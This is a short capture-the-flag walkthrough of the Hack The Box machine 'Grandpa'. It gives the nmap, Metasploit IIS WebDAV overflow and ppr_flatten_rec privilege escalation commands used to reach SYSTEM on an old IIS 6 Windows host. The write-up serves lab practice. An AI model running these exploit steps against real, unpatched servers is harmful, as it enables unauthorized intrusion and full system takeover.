# Hack the box - Grandpa

<img align="left" src="logo.png">
&nbsp;<span style="color:#b5e853; font-weight: bold">OS: <img align="top" src="../../../images/windows.png"> </span><b>Windows</b>
&nbsp;<span style="color:#b5e853; font-weight: bold">IP: </span><b>10.10.10.14</b>

&nbsp;<span style="color:#b5e853; font-weight: bold">Difficulity: </span><b>Easy</b>
&nbsp;<span style="color:#b5e853; font-weight: bold">Release: </span><b>2017 Apr 17</b>

___

## Port scanning
```
nmap -sC -sV -T4 -oA nmap 10.10.10.14
```

![Nmap results](./nmap.png)

There ISS 6 web server running on this machine.

## Web exploration

When we go to index page, we can identify that there is ISS web server running.

![Index page](index_page.png)

## Exploitation

Since this is old machine IIS exploit could be on metasploit

```
msfconsole
search iis
```

![Metasploit search](vuln_search_metasploit.png)

Comparing previous nmap scan we quickly notify webdav overflow:

```
use exploit/windows/iis/iis_webdav_scstoragepathfromurl
set rhosts 10.10.10.14
run
```

![Exploitation](exploitation.png)

We got a shell access.

## Privilege escalation

When we try to identify user this happens:

![Get user fail](whoami_fail.png)

We can migrate to other process:

```
ps
migrate 1008
```

![Process migration](ps.png)

Time to explore potential privilege escalation exploits:

```
background
use post/multi/recon/local_exploit_suggester
set session 1
run
```

![Privilege escalation scan](priv_esc.png)

Machine is potentialy vulnerable to many exploits. Let's try last one:

```
use exploit/windows/local/ppr_flatten_rec
set session 1
set lhost 10.10.x.x
run
```

![Privilege escalation](priv_esc.png)

We are the system user!

## Capturing the flags

Time to finish this challenge:

![Flags capture](flags_capture.png)